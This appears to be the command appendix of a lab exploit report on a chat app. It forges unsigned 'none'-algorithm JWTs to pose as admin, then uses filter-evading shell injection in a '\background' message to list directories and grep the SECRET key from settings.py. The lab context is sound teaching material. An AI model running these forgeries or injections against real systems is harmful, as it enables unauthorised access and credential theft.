In the following, the commands used during the exploit are listed, such that they can be copy pasted
into a terminal window, since copy pasting from a LaTeX generated PDF may be painful.

Part 1: JWT Exploit to Bypass Authentication
============================================

Step 2
======
The retrieved token for the user max may look as follows:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE0ODE1NTQwNzgsImVtYWlsIjoibWF4QHdlYi5uZXRjaGF0Iiwib3JpZ19pYXQiOjE0ODE0Njc2NzgsInVzZXJfaWQiOjIsInVzZXJuYW1lIjoibWF4In0.1O1YDjSTN-vMe7I2hmky2eagTYOp78I0UdQyKL8i76c

However, the following crafted token for max (null algorithm, no signature, expiration date set to 2030) can be used in the following:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJvcmlnX2lhdCI6MTQ4MDY5NDgzMCwidXNlcm5hbWUiOiJtYXgiLCJ1c2VyX2lkIjoyLCJleHAiOjE4OTM0NTYwMDAsImVtYWlsIjoibWF4QGV0aHouY2gifQ.

Command to create new chat message (as user max):
curl https://web.netchat/api/messages/ --insecure --data 'text=Hello World' -H 'Authorization: JWT eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJvcmlnX2lhdCI6MTQ4MDY5NDgzMCwidXNlcm5hbWUiOiJtYXgiLCJ1c2VyX2lkIjoyLCJleHAiOjE4OTM0NTYwMDAsImVtYWlsIjoibWF4QGV0aHouY2gifQ.'

Step 4
======
Example of a crafted token for the user admin (null algorithm, no signature, expiration date set to 2030):
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJvcmlnX2lhdCI6MTQ4MDY5NDgzMCwidXNlcm5hbWUiOiJhZG1pbiIsInVzZXJfaWQiOjEsImV4cCI6MTg5MzQ1NjAwMCwiZW1haWwiOiJtYXhAZXRoei5jaCJ9.

Command to create new chat message as admin (by using the fake admin token):
curl https://web.netchat/api/messages/ --insecure --data "text=Hello World" -H "Authorization: JWT eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJvcmlnX2lhdCI6MTQ4MDY5NDgzMCwidXNlcm5hbWUiOiJhZG1pbiIsInVzZXJfaWQiOjEsImV4cCI6MTg5MzQ1NjAwMCwiZW1haWwiOiJtYXhAZXRoei5jaCJ9."


Part 2: Expose the Secret Key with a Bash Injection
===================================================

Step 1
======
Command to change background color to red (by using the fake admin token):
curl https://web.netchat/api/messages/ --insecure --data 'text=\background red' -H 'Authorization: JWT eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJvcmlnX2lhdCI6MTQ4MDY5NDgzMCwidXNlcm5hbWUiOiJhZG1pbiIsInVzZXJfaWQiOjEsImV4cCI6MTg5MzQ1NjAwMCwiZW1haWwiOiJtYXhAZXRoei5jaCJ9.'

Step 2
======
Command to retrieve the CSS layout:
curl https://web.netchat/api/css/ --insecure -H 'Authorization: JWT eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJvcmlnX2lhdCI6MTQ4MDY5NDgzMCwidXNlcm5hbWUiOiJhZG1pbiIsInVzZXJfaWQiOjEsImV4cCI6MTg5MzQ1NjAwMCwiZW1haWwiOiJtYXhAZXRoei5jaCJ9.'

Step 3
======
Command to set the background color to 'helloworld':
curl https://web.netchat/api/messages/ --insecure --data 'text=\background helloworld' -H 'Authorization: JWT eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJvcmlnX2lhdCI6MTQ4MDY5NDgzMCwidXNlcm5hbWUiOiJhZG1pbiIsInVzZXJfaWQiOjEsImV4cCI6MTg5MzQ1NjAwMCwiZW1haWwiOiJtYXhAZXRoei5jaCJ9.'

Step 4
======
Command to list the contents of the current working directory (yields an error):
curl https://web.netchat/api/messages/ --insecure --data 'text=\background $(ls)' -H 'Authorization: JWT eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJvcmlnX2lhdCI6MTQ4MDY5NDgzMCwidXNlcm5hbWUiOiJhZG1pbiIsInVzZXJfaWQiOjEsImV4cCI6MTg5MzQ1NjAwMCwiZW1haWwiOiJtYXhAZXRoei5jaCJ9.'

Command from above without error (removed newlines from result, replace whitespace):
curl https://web.netchat/api/messages/ --insecure --data 'text=\background $(ls|tr$IFS"\n"$IFS",")' -H 'Authorization: JWT eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJvcmlnX2lhdCI6MTQ4MDY5NDgzMCwidXNlcm5hbWUiOiJhZG1pbiIsInVzZXJfaWQiOjEsImV4cCI6MTg5MzQ1NjAwMCwiZW1haWwiOiJtYXhAZXRoei5jaCJ9.'

Step 5
======
Command to list the contents of the 'chat' directory:
curl https://web.netchat/api/messages/ --insecure --data 'text=\background $(ls$IFS"chat"|tr$IFS"\n"$IFS",")' -H 'Authorization: JWT eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJvcmlnX2lhdCI6MTQ4MDY5NDgzMCwidXNlcm5hbWUiOiJhZG1pbiIsInVzZXJfaWQiOjEsImV4cCI6MTg5MzQ1NjAwMCwiZW1haWwiOiJtYXhAZXRoei5jaCJ9.'

Step 6
======
Command to expose the contents of the 'settings.py' file:
curl https://web.netchat/api/messages/ --insecure --data 'text=\background $({grep,SECRET,chat/settings.py})' -H 'Authorization: JWT eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJvcmlnX2lhdCI6MTQ4MDY5NDgzMCwidXNlcm5hbWUiOiJhZG1pbiIsInVzZXJfaWQiOjEsImV4cCI6MTg5MzQ1NjAwMCwiZW1haWwiOiJtYXhAZXRoei5jaCJ9.'
